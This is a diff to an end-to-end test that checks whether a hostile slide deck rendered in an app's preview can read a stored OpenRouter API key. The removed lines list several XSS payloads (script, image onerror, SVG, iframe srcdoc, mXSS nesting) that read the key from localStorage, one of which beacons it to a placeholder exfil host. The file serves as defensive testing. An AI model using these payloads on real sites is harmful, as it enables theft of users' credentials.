@@ -1,3 +1,4 @@
+import { BEACON_HOST, HOSTILE, SEEDED_KEY } from './hostile-deck';
 import { storedOpenRouterKey } from './openrouter-key-helper';
 import { expect, gotoStudio, LIVE_PREVIEW, livePreview, test, typeDeck } from './studio-fixture';
 
@@ -21,42 +22,13 @@ import { expect, gotoStudio, LIVE_PREVIEW, livePreview, test, typeDeck } from '.
 // paths that do not run <script>; they are kept as a tripwire in case that ever changes.
 // (engineering/decisions/2026-11-06-studio-byok-key-lifecycle.md §4, HARD RULE #22.)
 //
-// Each payload tries to append `<vector>:<key>` to `top.__byokLeak`, and the image vectors
-// also try a beacon to an unroutable host. Typing the deck is how the markup arrives here; a
+// The vectors live in `hostile-deck.ts`, shared with `byok-key-isolation-surfaces.spec.ts`. Typing the deck is how the markup arrives here; a
 // deck opened from a share link or a `.lattice` file lands in the same renderer.
-
-const SEEDED_KEY = 'sk-or-e2e-isolation-canary';
-const leak = (tag: string) => `top.__byokLeak=(top.__byokLeak||[]).concat('${tag}:'+localStorage.getItem('lattice-db-or-key'))`;
-
-const HOSTILE = [
-	'# Isolation probe',
-	'',
-	'Probe body text.',
-	'',
-	`<script>${leak('script')}</script>`,
-	'',
-	`<img src="x" onerror="${leak('img-onerror')};new Image().src='https://exfil.invalid/?k='+localStorage.getItem('lattice-db-or-key')">`,
-	'',
-	`<svg onload="${leak('svg-onload')}"><circle r="1"/></svg>`,
-	'',
-	`<svg><script>${leak('svg-script')}</script></svg>`,
-	'',
-	`<details open ontoggle="${leak('details-ontoggle')}"><summary>s</summary>x</details>`,
-	'',
-	`<iframe srcdoc="<script>${leak('iframe-srcdoc').replace(/'/g, '&#39;')}</script>"></iframe>`,
-	'',
-	`<style>section{}</style><img src="x" onerror="${leak('after-style')}">`,
-	'',
-	`<object data="javascript:${leak('object')}"></object>`,
-	'',
-	// LAST: the unclosed mXSS nest swallows whatever follows it, so nothing may come after.
-	`<math><mtext><table><mglyph><style><img src=x onerror="${leak('mxss')}">`,
-].join('\n');
 
 test('@smoke @crosswidth @webkit-phone @webkit-tablet @gecko a hostile deck in the preview cannot read the stored OpenRouter key', async ({ page }) => {
 	test.slow();
 	const beacons: string[] = [];
-	await page.route('https://exfil.invalid/**', async (route) => {
+	await page.route(`${BEACON_HOST}/**`, async (route) => {
 		beacons.push(route.request().url());
 		await route.abort();
 	});
